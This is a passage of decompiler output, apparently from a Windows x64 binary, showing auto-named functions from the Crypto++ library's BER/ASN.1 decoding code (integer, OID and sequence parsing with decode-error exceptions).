__int64 sub_13F10AC68()
{
  return ((__int64 (*)(void))(_security_cookie ^ 0x2CC598517BDEi64))();
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C4328: using guessed type __int64 qword_13F1C4328;

//----- (000000013F10AC80) ----------------------------------------------------
__int64 (*sub_13F10AC80())(void)
{
  __int64 (*result)(void); // rax

  result = (__int64 (*)(void))(_security_cookie ^ 0x2CC598689B3Ei64);
  if ( _security_cookie != 0x2CC598689B3Ei64 )
    return (__int64 (*)(void))result();
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C4288: using guessed type __int64 qword_13F1C4288;

//----- (000000013F10ACD0) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F10ACD0(__int64 a1, int *a2, char a3, unsigned int a4, unsigned int a5)
{
  unsigned __int64 v9; // rax
  unsigned __int64 v10; // rbx
  unsigned __int64 v11; // r12
  unsigned int v12; // esi
  _BYTE *v13; // rbp
  _BYTE *v14; // rcx
  unsigned __int64 result; // rax
  int v16; // edx
  char v17[8]; // [rsp+20h] [rbp-78h] BYREF
  unsigned __int64 v18[14]; // [rsp+28h] [rbp-70h] BYREF

  v18[1] = -2i64;
  if ( !(*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)a1 + 152i64))(a1, v17) || v17[0] != a3 )
    sub_13F10BF50();
  if ( !sub_13F10BFE0(a1, v18) )
    sub_13F10BF50();
  v9 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 128i64))(a1);
  v10 = v18[0];
  if ( v18[0] > v9 )
    sub_13F10BF50();
  if ( a3 == 1 )
  {
    if ( v18[0] != 1 )
      sub_13F10BF50();
  }
  else if ( ((a3 - 2) & 0xF7) == 0 && !v18[0] )
  {
    sub_13F10BF50();
  }
  v18[3] = -1i64;
  v11 = v18[0];
  v18[4] = v18[0];
  v12 = 0;
  if ( v18[0] )
    v13 = (_BYTE *)sub_13F12E4E0(v18[0]);
  else
    v13 = 0i64;
  v18[5] = (unsigned __int64)v13;
  if ( v10 != (*(__int64 (__fastcall **)(__int64, _BYTE *, unsigned __int64))(*(_QWORD *)a1 + 144i64))(a1, v13, v10) )
    sub_13F10BF50();
  v14 = v13;
  result = v10;
  if ( v10 > 4 )
  {
    do
    {
      if ( *v14 )
        break;
      result = --v10;
      ++v14;
    }
    while ( v10 > 4 );
    if ( result > 4 )
      sub_13F10BF50();
  }
  *a2 = 0;
  if ( result )
  {
    result = 0i64;
    do
    {
      v16 = (*a2 << 8) | (unsigned __int8)v14[result];
      *a2 = v16;
      result = ++v12;
    }
    while ( v12 < v10 );
    v12 = v16;
  }
  if ( v12 < a4 || v12 > a5 )
    sub_13F10BF50();
  if ( v13 )
  {
    memset(v13, 0, v11);
    return sub_13F12E550(v13);
  }
  return result;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F10ACD0: using guessed type char var_78[8];

//----- (000000013F10AE80) ----------------------------------------------------
__int64 __fastcall sub_13F10AE80(__int64 *a1, const __m128i *a2, __int32 *a3)
{
  __int64 v6; // rcx
  __int64 v7; // r15
  __int64 v8; // rax
  unsigned __int64 v9; // r14
  unsigned __int64 v10; // rax
  unsigned __int64 v11; // rcx
  unsigned __int64 v12; // rbx
  __m128i *v13; // rsi
  const __m128i *v14; // r8
  const __m128i *v15; // rdx
  __m128i *v16; // rcx
  unsigned __int64 v17; // r8

  v6 = *a1;
  v7 = ((__int64)a2->m128i_i64 - v6) >> 2;
  v8 = (a1[1] - v6) >> 2;
  if ( v8 == 0x3FFFFFFFFFFFFFFFi64 )
    sub_13F10D1F0();
  v9 = v8 + 1;
  v10 = (a1[2] - v6) >> 2;
  v11 = v10 >> 1;
  if ( v10 <= 0x3FFFFFFFFFFFFFFFi64 - (v10 >> 1) )
  {
    v12 = v11 + v10;
    if ( v11 + v10 < v9 )
      v12 = v9;
  }
  else
  {
    v12 = v9;
  }
  v13 = (__m128i *)sub_13F10D210((__int64)a1, v12);
  v13->m128i_i32[v7] = *a3;
  v14 = (const __m128i *)a1[1];
  v15 = (const __m128i *)*a1;
  v16 = v13;
  if ( a2 == v14 )
  {
    v17 = (char *)v14 - (char *)v15;
  }
  else
  {
    sub_13F15EB00(v13, v15, (char *)a2 - (char *)v15);
    v16 = (__m128i *)&v13->m128i_i8[4 * v7 + 4];
    v17 = a1[1] - (_QWORD)a2;
    v15 = a2;
  }
  sub_13F15EB00(v16, v15, v17);
  sub_13F10D160(a1, (__int64)v13, v9, v12);
  return *a1 + 4 * v7;
}

//----- (000000013F10AF90) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F10AF90(__int64 a1, unsigned __int64 a2)
{
  __int64 v4; // rdi
  const __m128i *v5; // rcx
  unsigned __int64 v6; // rsi
  unsigned __int64 result; // rax
  unsigned __int64 v8; // rdx
  unsigned __int64 v9; // rdi
  __m128i *v10; // r15
  unsigned __int64 v11; // rbx

  v4 = *(_QWORD *)(a1 + 8);
  v5 = *(const __m128i **)a1;
  v6 = (v4 - (__int64)v5) >> 2;
  result = (__int64)(*(_QWORD *)(a1 + 16) - (_QWORD)v5) >> 2;
  if ( a2 <= result )
  {
    if ( a2 <= v6 )
    {
      if ( a2 != v6 )
      {
        result = (unsigned __int64)v5 + 4 * a2;
        *(_QWORD *)(a1 + 8) = result;
      }
    }
    else
    {
      v11 = 4 * (a2 - v6);
      sub_13F15EF70(v4, 0, v11);
      result = v11 + v4;
      *(_QWORD *)(a1 + 8) = v11 + v4;
    }
  }
  else
  {
    if ( a2 > 0x3FFFFFFFFFFFFFFFi64 )
      sub_13F10D1F0();
    v8 = result >> 1;
    if ( result <= 0x3FFFFFFFFFFFFFFFi64 - (result >> 1) )
    {
      v9 = v8 + result;
      if ( v8 + result < a2 )
        v9 = a2;
    }
    else
    {
      v9 = a2;
    }
    v10 = (__m128i *)sub_13F10D210(a1, v9);
    sub_13F15EF70((__int64)v10->m128i_i64 + 4 * v6, 0, 4 * (a2 - v6));
    sub_13F15EB00(v10, *(const __m128i **)a1, *(_QWORD *)(a1 + 8) - *(_QWORD *)a1);
    return sub_13F10D160((__int64 *)a1, (__int64)v10, a2, v9);
  }
  return result;
}

//----- (000000013F10B0B0) ----------------------------------------------------
_QWORD *__fastcall sub_13F10B0B0(_QWORD *a1, const __m128i *a2)
{
  sub_13F101F00((__int64)a1, a2);
  *a1 = off_13F181CF0;
  return a1;
}
// 13F181CF0: using guessed type __int64 (__fastcall *off_13F181CF0[2])();

//----- (000000013F10B0E0) ----------------------------------------------------
__int64 __fastcall sub_13F10B0E0(__int64 a1)
{
  __int64 v2; // rdx
  __int64 v3; // rcx
  __m128i v5; // [rsp+30h] [rbp-38h] BYREF
  __m128i si128; // [rsp+40h] [rbp-28h]

  si128 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v5.m128i_i8[0] = 0;
  sub_13F106C50(&v5, (const __m128i *)"BER decode error", 0x10ui64);
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = 1;
  sub_13F1053F0((__m128i **)(a1 + 32), &v5);
  *(_QWORD *)a1 = off_13F181CC0;
  if ( si128.m128i_i64[1] >= 0x10ui64 )
  {
    v2 = si128.m128i_i64[1] + 1;
    v3 = v5.m128i_i64[0];
    if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )
    {
      v2 = si128.m128i_i64[1] + 40;
      v3 = *(_QWORD *)(v5.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v5.m128i_i64[0] - v3 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v3, v2);
  }
  *(_QWORD *)a1 = off_13F181CF0;
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();
// 13F181CC0: using guessed type __int64 (__fastcall *off_13F181CC0[3])();
// 13F181CF0: using guessed type __int64 (__fastcall *off_13F181CF0[2])();
// 13F19CCC0: using guessed type __int128 xmmword_13F19CCC0;

//----- (000000013F10B1D0) ----------------------------------------------------
__int64 __fastcall sub_13F10B1D0(__int64 a1, __int64 a2, char a3)
{
  sub_13F10EE30(a1, 0);
  *(_DWORD *)(a1 + 24) = -1;
  *(_QWORD *)a1 = off_13F181ED8;
  *(_BYTE *)(a1 + 32) = 0;
  *(_QWORD *)(a1 + 8) = off_13F182050;
  *(_QWORD *)(a1 + 40) = a2;
  *(_QWORD *)(a1 + 48) = 0i64;
  *(_BYTE *)(a1 + 56) = 0;
  sub_13F10CF80(a1, a3);
  return a1;
}
// 13F181ED8: using guessed type __int64 (__fastcall *off_13F181ED8[47])();
// 13F182050: using guessed type __int64 (__fastcall *off_13F182050[4])();

//----- (000000013F10B240) ----------------------------------------------------
__int64 __fastcall sub_13F10B240(__int64 a1, __int64 a2)
{
  __int64 v5; // [rsp+30h] [rbp+8h] BYREF

  v5 = a1;
  sub_13F10EE30(a1, 0);
  *(_DWORD *)(a1 + 24) = -1;
  *(_QWORD *)a1 = off_13F181ED8;
  *(_BYTE *)(a1 + 32) = 0;
  *(_QWORD *)(a1 + 8) = off_13F182050;
  *(_QWORD *)(a1 + 40) = a2;
  *(_QWORD *)(a1 + 48) = 0i64;
  *(_BYTE *)(a1 + 56) = 0;
  if ( !(*(__int64 (__fastcall **)(__int64, __int64 *))(*(_QWORD *)a2 + 152i64))(a2, &v5)
    || (_BYTE)v5 != 48
    || !sub_13F10C090(*(_QWORD *)(a1 + 40), (unsigned __int64 *)(a1 + 48), (_BYTE *)(a1 + 57)) )
  {
    sub_13F10BF50();
  }
  *(_QWORD *)a1 = off_13F182200;
  *(_QWORD *)(a1 + 8) = off_13F182378;
  return a1;
}
// 13F181ED8: using guessed type __int64 (__fastcall *off_13F181ED8[47])();
// 13F182050: using guessed type __int64 (__fastcall *off_13F182050[4])();
// 13F182200: using guessed type __int64 (__fastcall *off_13F182200[47])();
// 13F182378: using guessed type __int64 (__fastcall *off_13F182378[4])();

//----- (000000013F10B300) ----------------------------------------------------
__int64 __fastcall sub_13F10B300(__int64 a1, __int64 a2, char a3)
{
  __int64 result; // rax

  sub_13F131450(a1, 0i64);
  *(_QWORD *)(a1 + 80) = a2;
  *(_QWORD *)a1 = off_13F182070;
  *(_QWORD *)(a1 + 8) = off_13F1821E0;
  result = a1;
  *(_BYTE *)(a1 + 88) = a3;
  *(_BYTE *)(a1 + 89) = 0;
  return result;
}
// 13F182070: using guessed type __int64 (__fastcall *off_13F182070[6])();
// 13F1821E0: using guessed type __int64 (__fastcall *off_13F1821E0[4])();

//----- (000000013F10B360) ----------------------------------------------------
_QWORD *__fastcall sub_13F10B360(_QWORD *a1, __int64 a2)
{
  unsigned __int64 v4; // rbp
  unsigned __int64 i; // rbp
  unsigned __int64 v6; // rbx
  unsigned int v7; // edi
  __m128i *v8; // rdx
  unsigned __int8 v10; // [rsp+78h] [rbp+10h] BYREF
  unsigned __int64 v11; // [rsp+80h] [rbp+18h] BYREF
  unsigned int v12; // [rsp+88h] [rbp+20h] BYREF

  *a1 = off_13F181EC8;
  a1[1] = 0i64;
  a1[2] = 0i64;
  a1[3] = 0i64;
  if ( !(*(__int64 (__fastcall **)(__int64, unsigned __int8 *))(*(_QWORD *)a2 + 152i64))(a2, &v10) || v10 != 6 )
    sub_13F10BF50();
  if ( !sub_13F10BFE0(a2, &v11) || (v4 = v11) == 0 )
    sub_13F10BF50();
  if ( !(*(__int64 (__fastcall **)(__int64, unsigned __int8 *))(*(_QWORD *)a2 + 152i64))(a2, &v10) )
    sub_13F10BF50();
  sub_13F10AF90((__int64)(a1 + 1), 2ui64);
  *(_DWORD *)a1[1] = v10 / 0x28u;
  *(_DWORD *)(a1[1] + 4i64) = v10 % 0x28u;
  for ( i = v4 - 1; i; i -= v6 )
  {
    v6 = 0i64;
    v7 = 0;
    do
    {
      if ( !(*(__int64 (__fastcall **)(__int64, unsigned __int64 *))(*(_QWORD *)a2 + 152i64))(a2, &v11) )
        sub_13F10BF50();
      ++v6;
      if ( v7 >= 0x2000000 )
        sub_13F10BF50();
      v7 = (v11 & 0x7F) + (v7 << 7);
      v12 = v7;
    }
    while ( (v11 & 0x80u) != 0i64 );
    if ( v6 > i )
      sub_13F10BF50();
    v8 = (__m128i *)a1[2];
    if ( (__m128i *)a1[3] == v8 )
    {
      sub_13F10AE80(a1 + 1, v8, (__int32 *)&v12);
    }
    else
    {
      v8->m128i_i32[0] = v7;
      a1[2] += 4i64;
    }
  }
  return a1;
}
// 13F181EC8: using guessed type __int64 (__fastcall *off_13F181EC8[2])();

//----- (000000013F10B520) ----------------------------------------------------
_QWORD *__fastcall sub_13F10B520(_QWORD *a1, __int64 a2)
{
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C(a2 + 8, (__int64)(a1 + 1));
  *a1 = &std::bad_cast::`vftable';
  return a1;
}
// 13F181C90: using guessed type void *std::bad_cast::`vftable';

//----- (000000013F10B560) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_13F10B560(__int64 a1))()
{
  __int64 (__fastcall **result)(); // rax
  unsigned __int16 v2; // [rsp+40h] [rbp+8h] BYREF

  *(_QWORD *)a1 = off_13F181ED8;
  result = off_13F182050;
  *(_QWORD *)(a1 + 8) = off_13F182050;
  if ( !*(_BYTE *)(a1 + 56) )
  {
    *(_BYTE *)(a1 + 56) = 1;
    if ( *(_BYTE *)(a1 + 57) )
    {
      if ( *(_QWORD *)(a1 + 48) )
        sub_13F10BF50();
    }
    else
    {
      result = (__int64 (__fastcall **)())sub_13F110490(*(__int64 **)(a1 + 40), &v2, 1);
      if ( result != (__int64 (__fastcall **)())2 || v2 )
        sub_13F10BF50();
    }
  }
  return result;
}
// 13F181ED8: using guessed type __int64 (__fastcall *off_13F181ED8[47])();
// 13F182050: using guessed type __int64 (__fastcall *off_13F182050[4])();

//----- (000000013F10B5E0) ----------------------------------------------------
// positive sp value has been detected, the output may be wrong!
__int64 __fastcall sub_13F10B5E0(__int64 a1)
{
  *(_QWORD *)a1 = off_13F182070;
  *(_QWORD *)(a1 + 8) = off_13F1821E0;
  if ( !*(_BYTE *)(a1 + 89) )
    sub_13F10D070(a1);
  return sub_13F1315A0((_QWORD *)a1);
}
// 13F17C1AA: positive sp value 8 has been found
// 13F182070: using guessed type __int64 (__fastcall *off_13F182070[6])();
// 13F1821E0: using guessed type __int64 (__fastcall *off_13F1821E0[4])();

//----- (000000013F10B638) ----------------------------------------------------
__int64 __fastcall sub_13F10B638(__int64 a1, char a2)
{
  return sub_13F10B660(a1 - 8, a2);
}

//----- (000000013F10B644) ----------------------------------------------------
__int64 __fastcall sub_13F10B644(__int64 a1, char a2)
{
  return sub_13F10B6A0(a1 - 8, a2);
}

//----- (000000013F10B660) ----------------------------------------------------
__int64 __fastcall sub_13F10B660(__int64 a1, char a2)
{
  sub_13F10B560(a1);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 64i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F10B6A0) ----------------------------------------------------
__int64 __fastcall sub_13F10B6A0(__int64 a1, char a2)
{
  sub_13F10B5E0(a1);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 96i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F10B6E0) ----------------------------------------------------
__int64 __fastcall sub_13F10B6E0(__int64 a1, char a2)
{
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 72i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F10B710) ----------------------------------------------------
bool __fastcall sub_13F10B710(_QWORD *a1)
{
  return !sub_13F131E90(a1);
}

//----- (000000013F10B730) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_13F10B730(__int64 a1, __int64 a2))()
{
  __int64 v3; // rdi
  __int64 v4; // rax
  __int64 v5; // rcx
  unsigned __int64 v6; // rdx
  unsigned __int8 v7; // si
  unsigned __int16 v9[2]; // [rsp+30h] [rbp-D0h] BYREF
  int v10; // [rsp+34h] [rbp-CCh] BYREF
  __int64 v11; // [rsp+38h] [rbp-C8h]
  __int64 (__fastcall **v12)(); // [rsp+40h] [rbp-C0h] BYREF
  __int64 v13; // [rsp+48h] [rbp-B8h]
  __int64 v14; // [rsp+58h] [rbp-A8h]
  __int64 (__fastcall **v15)(); // [rsp+60h] [rbp-A0h] BYREF
  __int64 (__fastcall **v16)(); // [rsp+68h] [rbp-98h]
  int v17; // [rsp+78h] [rbp-88h]
  char v18; // [rsp+80h] [rbp-80h]
  __int64 *v19; // [rsp+88h] [rbp-78h]
  unsigned __int64 v20; // [rsp+90h] [rbp-70h] BYREF
  char v21; // [rsp+98h] [rbp-68h]
  char v22[7]; // [rsp+99h] [rbp-67h] BYREF
  __int64 v23[5]; // [rsp+A0h] [rbp-60h] BYREF
  __int64 *v24; // [rsp+C8h] [rbp-38h]
  __int64 v25; // [rsp+D0h] [rbp-30h]
  char v26; // [rsp+D8h] [rbp-28h]
  char v27; // [rsp+D9h] [rbp-27h]
  __int64 v28[3]; // [rsp+E0h] [rbp-20h] BYREF
  int v29; // [rsp+F8h] [rbp-8h]
  char v30; // [rsp+100h] [rbp+0h]
  __int64 *v31; // [rsp+108h] [rbp+8h]
  unsigned __int64 v32; // [rsp+110h] [rbp+10h] BYREF
  char v33; // [rsp+118h] [rbp+18h]
  char v34[7]; // [rsp+119h] [rbp+19h] BYREF

  v11 = -2i64;
  sub_13F10B240((__int64)v23, a2);
  v3 = 0i64;
  sub_13F10ACD0((__int64)v23, &v10, 2, 0, 0);
  sub_13F10EE30((__int64)&v15, 0);
  v17 = -1;
  v18 = 0;
  v15 = off_13F181ED8;
  v16 = off_13F182050;
  v19 = v23;
  v20 = 0i64;
  v21 = 0;
  if ( !(*(__int64 (__fastcall **)(__int64 *, unsigned __int16 *))(v23[0] + 152))(v23, v9) || LOBYTE(v9[0]) != 48 )
    sub_13F10BF50();
  if ( !sub_13F10C090((__int64)v19, &v20, v22) )
    sub_13F10BF50();
  v15 = off_13F182200;
  v16 = off_13F182378;
  v4 = (*(__int64 (__fastcall **)(__int64, __int64 (__fastcall ***)()))(*(_QWORD *)a1 + 32i64))(a1, &v12);
  sub_13F10BEA0(v4, (__int64)&v15);
  v12 = off_13F181EC8;
  v5 = v13;
  if ( v13 )
  {
    v6 = 4 * ((v14 - v13) >> 2);
    if ( v6 >= 0x1000 )
    {
      v6 += 39i64;
      v5 = *(_QWORD *)(v13 - 8);
      if ( (unsigned __int64)(v13 - v5 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v5, v6);
  }
  if ( v22[0] )
  {
    if ( v20 )
    {
LABEL_10:
      v7 = (*(__int64 (__fastcall **)(__int64, __int64 (__fastcall ***)()))(*(_QWORD *)a1 + 40i64))(a1, &v15);
      goto LABEL_11;
    }
  }
  else if ( sub_13F1109A0(v19, &v10, 1) != 2 || (_WORD)v10 )
  {
    goto LABEL_10;
  }
  v7 = 0;
LABEL_11:
  v21 = 1;
  if ( v22[0] )
  {
    if ( v20 )
      sub_13F10BF50();
  }
  else if ( sub_13F110490(v19, (unsigned __int16 *)&v10, 1) != 2 || (_WORD)v10 )
  {
    sub_13F10BF50();
  }
  sub_13F10EE30((__int64)v28, 0);
  v29 = -1;
  v30 = 0;
  v28[0] = (__int64)off_13F181ED8;
  v28[1] = (__int64)off_13F182050;
  v31 = v23;
  v32 = 0i64;
  v33 = 0;
  if ( !(*(__int64 (__fastcall **)(__int64 *, int *))(v23[0] + 152))(v23, &v10) || (_BYTE)v10 != 4 )
    sub_13F10BF50();
  if ( !sub_13F10C090((__int64)v31, &v32, v34) )
    sub_13F10BF50();
  if ( !v34[0] )
    sub_13F10BF50();
  if ( v27 )
    v3 = v25;
  (*(void (__fastcall **)(__int64, __int64 *, _QWORD, __int64))(*(_QWORD *)a1 + 56i64))(a1, v28, v7, v3);
  v33 = 1;
  if ( v34[0] )
  {
    if ( v32 )
      sub_13F10BF50();
  }
  else if ( sub_13F110490(v31, v9, 1) != 2 || v9[0] )
  {
    sub_13F10BF50();
  }
  if ( v27 )
  {
    if ( !v25 )
      goto LABEL_36;
    goto LABEL_35;
  }
  if ( sub_13F1109A0(v24, v9, 1) != 2 || v9[0] )
LABEL_35:
    (*(void (__fastcall **)(__int64, __int64 *))(*(_QWORD *)a1 + 72i64))(a1, v23);
LABEL_36:
  v26 = 1;
  if ( v27 )
  {
    if ( v25 )
      sub_13F10BF50();
  }
  else if ( sub_13F110490(v24, v9, 1) != 2 || v9[0] )
  {
    sub_13F10BF50();
  }
  sub_13F10B560((__int64)v28);
  sub_13F10B560((__int64)&v15);
  return sub_13F10B560((__int64)v23);
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F181EC8: using guessed type __int64 (__fastcall *off_13F181EC8[2])();
// 13F181ED8: using guessed type __int64 (__fastcall *off_13F181ED8[47])();
// 13F182050: using guessed type __int64 (__fastcall *off_13F182050[4])();
// 13F182200: using guessed type __int64 (__fastcall *off_13F182200[47])();
// 13F182378: using guessed type __int64 (__fastcall *off_13F182378[4])();
// 13F10B730: using guessed type char var_B7[7];
// 13F10B730: using guessed type char var_37[7];

//----- (000000013F10BB00) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_13F10BB00(__int64 a1, __int64 a2))()
{
  unsigned __int64 v3; // rsi
  __int64 v4; // rax
  __int64 v5; // rcx
  unsigned __int64 v6; // rdx
  unsigned __int8 v7; // di
  unsigned __int16 v9[2]; // [rsp+20h] [rbp-E0h] BYREF
  unsigned __int16 v10[2]; // [rsp+24h] [rbp-DCh] BYREF
  __int64 v11; // [rsp+28h] [rbp-D8h]
  __int64 (__fastcall **v12)(); // [rsp+30h] [rbp-D0h] BYREF
  __int64 v13; // [rsp+38h] [rbp-C8h]
  __int64 v14; // [rsp+48h] [rbp-B8h]
  __int64 (__fastcall **v15)(); // [rsp+50h] [rbp-B0h] BYREF
  __int64 (__fastcall **v16)(); // [rsp+58h] [rbp-A8h]
  int v17; // [rsp+68h] [rbp-98h]
  char v18; // [rsp+70h] [rbp-90h]
  __int64 *v19; // [rsp+78h] [rbp-88h]
  unsigned __int64 v20; // [rsp+80h] [rbp-80h] BYREF
  char v21; // [rsp+88h] [rbp-78h]
  char v22[7]; // [rsp+89h] [rbp-77h] BYREF
  __int64 v23[3]; // [rsp+90h] [rbp-70h] BYREF
  int v24; // [rsp+A8h] [rbp-58h]
  char v25; // [rsp+B0h] [rbp-50h]
  __int64 *v26; // [rsp+B8h] [rbp-48h]
  unsigned __int64 v27; // [rsp+C0h] [rbp-40h] BYREF
  char v28; // [rsp+C8h] [rbp-38h]
  char v29[7]; // [rsp+C9h] [rbp-37h] BYREF
  __int64 v30[7]; // [rsp+D0h] [rbp-30h] BYREF
  char v31; // [rsp+108h] [rbp+8h]
  char v32; // [rsp+109h] [rbp+9h]

  v11 = -2i64;
  sub_13F10B240((__int64)v30, a2);
  sub_13F10EE30((__int64)&v15, 0);
  v17 = -1;
  v18 = 0;
  v15 = off_13F181ED8;
  v16 = off_13F182050;
  v19 = v30;
  v3 = 0i64;
  v20 = 0i64;
  v21 = 0;
  if ( !(*(__int64 (__fastcall **)(__int64 *, unsigned __int16 *))(v30[0] + 152))(v30, v9) || LOBYTE(v9[0]) != 48 )
    sub_13F10BF50();
  if ( !sub_13F10C090((__int64)v19, &v20, v22) )
    sub_13F10BF50();
  v15 = off_13F182200;
  v16 = off_13F182378;
  v4 = (*(__int64 (__fastcall **)(__int64, __int64 (__fastcall ***)()))(*(_QWORD *)a1 + 32i64))(a1, &v12);
  sub_13F10BEA0(v4, (__int64)&v15);
  v12 = off_13F181EC8;
  v5 = v13;
  if ( v13 )
  {
    v6 = 4 * ((v14 - v13) >> 2);
    if ( v6 >= 0x1000 )
    {
      v6 += 39i64;
      v5 = *(_QWORD *)(v13 - 8);
      if ( (unsigned __int64)(v13 - v5 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v5, v6);
  }
  if ( v22[0] )
  {
    if ( v20 )
    {
LABEL_10:
      v7 = (*(__int64 (__fastcall **)(__int64, __int64 (__fastcall ***)()))(*(_QWORD *)a1 + 40i64))(a1, &v15);
      goto LABEL_11;
    }
  }
  else if ( sub_13F1109A0(v19, v10, 1) != 2 || v10[0] )
  {
    goto LABEL_10;
  }
  v7 = 0;
LABEL_11:
  v21 = 1;
  if ( v22[0] )
  {
    if ( v20 )
      sub_13F10BF50();
  }
  else if ( sub_13F110490(v19, v10, 1) != 2 || v10[0] )
  {
    sub_13F10BF50();
  }
  sub_13F10EE30((__int64)v23, 0);
  v24 = -1;
  v25 = 0;
  v23[0] = (__int64)off_13F181ED8;
  v23[1] = (__int64)off_13F182050;
  v26 = v30;
  v27 = 0i64;
  v28 = 0;
  if ( !(*(__int64 (__fastcall **)(__int64 *, unsigned __int16 *))(v30[0] + 152))(v30, v10) || LOBYTE(v10[0]) != 3 )
    sub_13F10BF50();
  if ( !sub_13F10C090((__int64)v26, &v27, v29) )
    sub_13F10BF50();
  if ( !v29[0] )
    sub_13F10BF50();
  if ( !(*(__int64 (__fastcall **)(__int64 *, unsigned __int16 *))(v23[0] + 152))(v23, v9) || LOBYTE(v9[0]) )
    sub_13F10BF50();
  if ( v29[0] )
    v3 = v27;
  (*(void (__fastcall **)(__int64, __int64 *, _QWORD, unsigned __int64))(*(_QWORD *)a1 + 56i64))(a1, v23, v7, v3);
  v28 = 1;
  if ( v29[0] )
  {
    if ( v27 )
      sub_13F10BF50();
  }
  else if ( sub_13F110490(v26, v9, 1) != 2 || v9[0] )
  {
    sub_13F10BF50();
  }
  v31 = 1;
  if ( v32 )
  {
    if ( v30[6] )
      sub_13F10BF50();
  }
  else if ( sub_13F110490((__int64 *)v30[5], v9, 1) != 2 || v9[0] )
  {
    sub_13F10BF50();
  }
  sub_13F10B560((__int64)v23);
  sub_13F10B560((__int64)&v15);
  return sub_13F10B560((__int64)v30);
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F181EC8: using guessed type __int64 (__fastcall *off_13F181EC8[2])();
// 13F181ED8: using guessed type __int64 (__fastcall *off_13F181ED8[47])();
// 13F182050: using guessed type __int64 (__fastcall *off_13F182050[4])();
// 13F182200: using guessed type __int64 (__fastcall *off_13F182200[47])();
// 13F182378: using guessed type __int64 (__fastcall *off_13F182378[4])();
// 13F10BB00: using guessed type char var_B7[7];
// 13F10BB00: using guessed type char var_77[7];

//----- (000000013F10BEA0) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_13F10BEA0(__int64 a1, __int64 a2))()
{
  __int64 v3; // r8
  unsigned __int64 *v4; // rcx
  __int64 v5; // rbx
  __int64 (__fastcall **result)(); // rax
  unsigned __int64 v7; // rdx
  __int64 v8; // rax
  __int64 (__fastcall **v9)(); // [rsp+28h] [rbp-30h] BYREF
  __int64 v10; // [rsp+30h] [rbp-28h]
  __int64 v11; // [rsp+38h] [rbp-20h]
  __int64 v12; // [rsp+40h] [rbp-18h]

  sub_13F10B360(&v9, a2);
  v3 = *(_QWORD *)(a1 + 16);
  v4 = *(unsigned __int64 **)(a1 + 8);
  v5 = v10;
  if ( (v3 - (__int64)v4) >> 2 != (v11 - v10) >> 2 || (unsigned int)sub_13F15F110(v4, v10, v3 - (_QWORD)v4) )
    sub_13F10BF50();
  result = off_13F181EC8;
  v9 = off_13F181EC8;
  if ( v5 )
  {
    v7 = (v12 - v5) & 0xFFFFFFFFFFFFFFFCui64;
    v8 = v5;
    if ( v7 >= 0x1000 )
    {
      v7 += 39i64;
      v5 = *(_QWORD *)(v5 - 8);
      if ( (unsigned __int64)(v8 - v5 - 8) > 0x1F )
        sub_13F1682C0();
    }
    return (__int64 (__fastcall **)())sub_13F14088C(v5, v7);
  }
  return result;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F181EC8: using guessed type __int64 (__fastcall *off_13F181EC8[2])();

//----- (000000013F10BF50) ----------------------------------------------------
void __noreturn sub_13F10BF50()
{
  char pExceptionObject[64]; // [rsp+20h] [rbp-58h] BYREF

  sub_13F10B0E0((__int64)pExceptionObject);
  CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVBERDecodeErr_CryptoPP__);
}

//----- (000000013F10BF80) ----------------------------------------------------
char __fastcall sub_13F10BF80(__int64 a1)
{
  char result; // al
  char v3; // [rsp+30h] [rbp+8h] BYREF
  unsigned __int64 v4; // [rsp+38h] [rbp+10h] BYREF

  if ( !(*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)a1 + 152i64))(a1, &v3)
    || v3 != 5
    || (result = sub_13F10BFE0(a1, &v4)) == 0
    || v4 )
  {
    sub_13F10BF50();
  }
  return result;
}

//----- (000000013F10BFD0) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_13F10BFD0(__int64 a1, __int64 *a2))()
{
  return sub_13F10CD00(a2, (__int64 *)(a1 + 24));
}

//----- (000000013F10BFE0) ----------------------------------------------------
char __fastcall sub_13F10BFE0(__int64 a1, unsigned __int64 *a2)
{
  unsigned __int64 v4; // rbx
  int v5; // edi
  char result; // al
  unsigned __int8 v7; // [rsp+40h] [rbp+8h] BYREF

  v4 = 0i64;
